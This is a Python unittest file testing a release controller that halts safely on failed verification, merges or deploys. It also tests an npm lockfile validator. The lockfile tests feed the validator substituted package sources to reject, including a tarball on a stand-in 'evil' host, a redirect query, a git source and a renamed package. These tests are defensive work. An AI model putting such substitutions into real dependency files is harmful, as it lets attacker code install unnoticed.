        self.assertFalse(any(event[0] == "git" and event[2] in ("add", "commit") for event in after_verify))
        self.assertEqual([event for event in self.effects if event[0] == "fix-push"], [published])
        self.assertEqual(self.controller.state["history"][0]["head"], "fixed-sha")
        self.assertEqual(self.controller.state["history"][0]["verifying_sha"], "github-merged-sha")

    def test_source_modification_during_verification_is_not_committed_or_published(self):
        self.configure_transaction(failure="verify-candidate", dirty=True,
                                   error=agent.Stop("Worktree changed during verification"))
        self.controller.finish("trusted-token")
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.assertEqual(self.operation["verifying_sha"], "fixed-sha")
        after_verify = self.effects[self.effects.index(("verify-candidate", "fixed-sha")) + 1:]
        self.assertFalse(any(event[0] == "git" and event[2] in ("add", "commit", "push") for event in after_verify))
        self.assertNotIn("fix-push", self.event_names())
        self.assertNotIn("pr-ci", self.event_names())
        self.external_run.assert_not_called()
        self.assertEqual(self.saved[-1], self.controller.state)

    def test_unsafe_cleanup_before_merge_halts_without_remote_effects(self):
        self.configure_transaction(failure="verify-candidate", dirty=True,
                                   error=agent.Unsafe("Cannot confirm container stopped"))
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("verifying")
        self.assertEqual(self.operation["verifying_sha"], "fixed-sha")
        self.assertNotIn("fix-push", self.event_names())
        self.assertNotIn("pr-ci", self.event_names())
        self.assertNotIn("production-push", self.event_names())
        self.external_run.assert_not_called()
        self.assertFalse(any("push" in call.args for call in self.git.call_args_list))

    def test_pr_ci_failure_never_merges_or_pushes(self):
        self.configure_transaction(failure="pr-ci")
        self.controller.finish("trusted-token")
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.assertIsNone(self.controller.state["halt"])
        self.assertEqual(self.saved[-1]["active"]["stage"], "needs-fix")
        self.external_run.assert_not_called()
        self.assertEqual(self.controller.verify.call_count, 1)
        self.assertNotIn("production-push", self.event_names())
        self.assertNotIn("http", self.event_names())
        self.assertFalse(any("push" in call.args for call in self.git.call_args_list))

    def test_unexpected_merge_parents_halt_before_reset_or_production(self):
        self.configure_transaction(parents="unrelated-parent pr-head")
        self.error = agent.Stop("Unexpected merge parents")
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("merging")
        self.assertIn("github-merge", self.event_names())
        self.assertNotIn("verify-merged", self.event_names())
        self.assertNotIn("production-push", self.event_names())
        self.assertFalse(any("reset" in call.args for call in self.git.call_args_list))

    def test_post_merge_verification_failure_never_promotes(self):
        self.configure_transaction(failure="verify-merged")
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("verifying-merged")
        self.assertIn(("verify-merged", "github-merged-sha"), self.effects)
        self.assertNotIn("main-ci", self.event_names())
        self.assertNotIn("production-push", self.event_names())
        self.assertNotIn("pages", self.event_names())

    def test_ambiguous_github_merge_timeout_persists_halt(self):
        self.configure_transaction(failure="github-merge", error=agent.subprocess.TimeoutExpired("gh", 120))
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("merging")
        self.assertTrue(self.did_merge)  # Server succeeded; client cannot safely retry.
        self.external_run.assert_called_once()
        self.assertNotIn("verify-merged", self.event_names())
        self.assertNotIn("production-push", self.event_names())

    def test_ambiguous_fix_push_error_persists_halt(self):
        self.configure_transaction(failure="fix-push", dirty=True)
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("publishing-fix")
        self.assertIn(("save", "publishing-fix", None), self.effects)
        self.assertLess(self.effects.index(("save", "publishing-fix", None)), self.effects.index(("fix-push", "fixed-sha")))
        self.assertNotIn("pr-ci", self.event_names())
        self.external_run.assert_not_called()

    def test_main_ci_failure_halts_after_publication(self):
        self.configure_transaction(failure="main-ci")
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("verifying-merged")
        self.assertEqual(self.remote[agent.BASE], "github-merged-sha")
        self.assertNotIn("pages", self.event_names())
        self.assertNotIn("http", self.event_names())
        self.assertFalse(any("push" in call.args for call in self.git.call_args_list))

    def test_pages_failure_halts_without_smoke_or_retry(self):
        self.configure_transaction(failure="pages")
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("releasing")
        self.assertNotIn("production-push", self.event_names())
        self.assertLess(self.event_names().index("main-ci"), self.event_names().index("pages"))
        self.assertNotIn("http", self.event_names())

    def test_http_failure_halts_after_pages_without_completion(self):
        self.configure_transaction(failure="http")
        self.controller.finish("trusted-token")
        self.assert_halted_without_retry("releasing")
        self.assertLess(self.event_names().index("pages"), self.event_names().index("http"))
        self.assertEqual(self.event_names().count("http"), 1)
        self.assertNotIn("production-push", self.event_names())


class LockIdentityTests(unittest.TestCase):
    def setUp(self):
        self.manifest = {"dependencies": {"vitest": "^5.1.0"}, "engines": {"node": "^26.13.0"}}
        self.lock = {"lockfileVersion": 3, "packages": {
            "": copy.deepcopy(self.manifest),
            "node_modules/vitest": {"version": "5.1.0",
                "resolved": "https://registry.npmjs.org/vitest/-/vitest-5.1.0.tgz",
                "integrity": "sha512-" + base64.b64encode(b"a" * 64).decode()}}}

    def test_canonical_public_npm_lock_accepted(self):
        agent.validate_lock(self.manifest, self.lock)

    def test_tarball_redirect_alias_query_or_wrong_version_rejected(self):
        for url in ("https://evil.invalid/vitest.tgz", "https://registry.npmjs.org/other/-/other-5.1.0.tgz",
                    "https://registry.npmjs.org/vitest/-/vitest-5.1.0.tgz?redirect=evil",
                    "https://registry.npmjs.org/vitest/-/vitest-5.2.0.tgz", "file:./src"):
            with self.subTest(url=url):
                self.lock["packages"]["node_modules/vitest"]["resolved"] = url
                with self.assertRaises(agent.Stop):
                    agent.validate_lock(self.manifest, self.lock)

    def test_lock_root_metadata_must_match_manifest(self):
        for key in ("dependencies", "engines"):
            with self.subTest(key=key):
                changed = copy.deepcopy(self.lock)
                changed["packages"][""][key] = {}
                with self.assertRaises(agent.Stop):
                    agent.validate_lock(self.manifest, changed)

    def test_links_and_renamed_packages_rejected(self):
        for extra in ({"link": True}, {"name": "replacement-runner"}, {"version": "git:evil"}):
            with self.subTest(extra=extra):
                changed = copy.deepcopy(self.lock)
                changed["packages"]["node_modules/vitest"].update(extra)
                with self.assertRaises(agent.Stop):
                    agent.validate_lock(self.manifest, changed)

    def test_integrity_required_and_well_formed(self):
        for value in ("", "sha1-abc", "sha512-invalid!", "sha512-YQ=="):
            with self.subTest(integrity=value):
                self.lock["packages"]["node_modules/vitest"]["integrity"] = value
                with self.assertRaises(agent.Stop):
                    agent.validate_lock(self.manifest, self.lock)

    def test_scoped_nested_package_identity(self):
        self.lock["packages"]["node_modules/vitest/node_modules/@scope/tool"] = {
            "version": "1.2.3", "resolved": "https://registry.npmjs.org/@scope/tool/-/tool-1.2.3.tgz",
            "integrity": "sha512-" + base64.b64encode(b"b" * 64).decode()}
        agent.validate_lock(self.manifest, self.lock)


if __name__ == "__main__":
    unittest.main()
